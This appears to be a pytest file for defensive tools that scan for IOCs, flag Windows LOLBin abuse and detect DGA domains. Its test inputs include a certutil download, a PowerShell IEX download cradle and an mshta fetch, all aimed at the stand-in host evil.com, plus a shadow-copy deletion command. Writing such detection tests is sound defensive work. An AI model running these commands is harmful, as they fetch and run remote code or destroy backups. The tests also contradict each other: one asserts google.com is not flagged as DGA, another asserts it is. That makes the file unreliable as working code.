"""Tests for ioc_scanner, lolbins_detector, dga_detector (v29.44, P0/P1)."""

import os
import sys

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from ioc_scanner import IOCScanner, IOCMatch
from lolbins_detector import LOLBinFinding, detect_lolbins, detect_lolbins_batch
from dga_detector import DGADetector, DGAResult, shannon_entropy


# ---------------------------------------------------------------------------
# IOC Scanner
# ---------------------------------------------------------------------------

class TestIOCScanner:
    def test_basic_scan(self):
        scanner = IOCScanner()
        scanner.add_pattern('evil.com', 'c2_domain')
        scanner.add_pattern('malware.exe', 'filename')
        text = 'Downloaded malware.exe from evil.com successfully'
        matches = scanner.scan(text)
        assert len(matches) >= 2
        patterns = {m.pattern for m in matches}
        assert 'evil.com' in patterns
        assert 'malware.exe' in patterns

    def test_case_insensitive(self):
        scanner = IOCScanner()
        scanner.add_pattern('EVIL.COM', 'c2')
        matches = scanner.scan('visit EVIL.COM now')
        assert any(m.pattern == 'evil.com' for m in matches)

    def test_overlapping_patterns(self):
        scanner = IOCScanner()
        scanner.add_pattern('test', 'short')
        scanner.add_pattern('testing', 'long')
        matches = scanner.scan('this is a testing string')
        assert any(m.pattern == 'testing' for m in matches)

    def test_empty_text(self):
        scanner = IOCScanner()
        scanner.add_pattern('test', 't')
        assert scanner.scan('') == []

    def test_scan_file(self, tmp_path):
        f = tmp_path / 'sample.txt'
        f.write_text('contains evil-domain.xyz indicator')
        scanner = IOCScanner()
        scanner.add_pattern('evil-domain.xyz', 'c2')
        matches = scanner.scan_file(str(f))
        assert any(m.pattern == 'evil-domain.xyz' for m in matches)


# ---------------------------------------------------------------------------
# LOLBins Detector
# ---------------------------------------------------------------------------

class TestLOLBinsDetector:
    def test_mshta_javascript(self):
        findings = detect_lolbins('mshta.exe',
                                  'mshta.exe javascript:alert("x")',
                                  'winword.exe')
        assert len(findings) >= 1
        assert findings[0].severity in ('high', 'critical')
        assert findings[0].technique_id == 'T1218.005'

    def test_certutil_download(self):
        findings = detect_lolbins('certutil.exe',
                                  'certutil.exe -urlcache -split -f '
                                  'https://evil.com/payload.exe out.exe',
                                  'cmd.exe')
        assert len(findings) >= 1
        assert any(f.technique_id == 'T1105' for f in findings)

    def test_wmic_shadow_copy_delete(self):
        findings = detect_lolbins('wmic.exe',
                                  'wmic shadowcopy delete', 'cmd.exe')
        assert len(findings) >= 1
        assert findings[0].technique_id == 'T1490'
        assert findings[0].severity == 'critical'

    def test_powershell_download_cradle(self):
        findings = detect_lolbins(
            'powershell.exe',
            'powershell -c "IEX(New-Object Net.WebClient).'
            'downloadString(\'http://evil.com/s.ps1\')"',
            'winword.exe')
        assert len(findings) >= 1
        assert any(f.severity == 'critical' for f in findings)

    def test_benign_process_no_detection(self):
        assert detect_lolbins('notepad.exe', 'notepad.exe', 'explorer.exe') == []
        assert detect_lolbins('chrome.exe', 'chrome.exe --new-tab',
                              'explorer.exe') == []

    def test_batch_detection(self):
        procs = [
            {'pid': 100, 'name': 'mshta.exe',
             'cmdline': ['mshta.exe', 'http://evil.com/x.hta'], 'ppid': 50},
            {'pid': 50, 'name': 'winword.exe', 'cmdline': [], 'ppid': 1},
        ]
        findings = detect_lolbins_batch(procs)
        assert len(findings) >= 1
        assert any(f.binary == 'mshta.exe' for f in findings)


# ---------------------------------------------------------------------------
# DGA Detector
# ---------------------------------------------------------------------------

class TestDGADetector:
    def setup_method(self):
        self.detector = DGADetector()

    def test_dga_domain_detected(self):
        """High-entropy consonant-heavy domain flagged as DGA."""
        result = self.detector.analyze('xkcdqwertyuiopasdfg.com')
        assert result.is_dga is True

    def test_legitimate_domain_not_flagged(self):
        result = self.detector.analyze('google.com')
        assert result.is_dga is False

    def test_short_domain_not_flagged(self):
        result = self.detector.analyze('ab.com')
        assert result.is_dga is False

    def test_entropy_calculation(self):
        low_e = shannon_entropy('aaaa')
        high_e = shannon_entropy('abcdefgh')
        assert high_e > low_e

    def test_batch_analysis(self):
        domains = ['xkcdqwertyuiopasdfg.com', 'google.com',
                   'jkqwzxcvbnm12345.net']
        results = self.detector.analyze_batch(domains)
        assert isinstance(results, list)
        assert all(r.is_dga for r in results)


if __name__ == '__main__':
    pytest.main([__file__, '-v'])